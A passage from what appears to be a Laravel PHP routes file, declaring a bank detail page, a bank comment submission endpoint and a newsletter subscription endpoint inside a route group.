    Route::get('bank/{id}', 'BankController@bank')->name('bank');
    Route::post('bank-comment', 'BankController@bank_comment')->name('bank-comment');
    Route::post('newsletter-subscription', 'NewsletterController@store')->name('newsletter_subscription');
});
